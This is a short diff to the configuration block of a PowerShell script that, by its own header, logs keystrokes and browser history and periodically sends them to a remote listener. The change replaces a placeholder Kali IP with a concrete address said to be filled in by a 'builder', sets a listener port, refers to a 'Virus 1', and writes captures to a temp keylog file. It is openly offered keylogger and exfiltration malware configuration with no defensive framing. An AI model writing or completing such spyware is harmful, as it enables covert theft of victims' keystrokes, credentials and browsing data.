@@ -1,7 +1,7 @@
 # This script logs keystrokes and browser history, then sends it periodically.
 
 # --- Configuration ---
-$ListenerIP = "YOUR_KALI_IP" # <-- IMPORTANT: Change this to your Kali's IP address
+$ListenerIP = "10.46.70.32" # This will be replaced by the builder
 $ListenerPort = "4445"       # <-- IMPORTANT: Use a different port than Virus 1
 $LogPath = "$env:TEMP\keylog.txt"
 
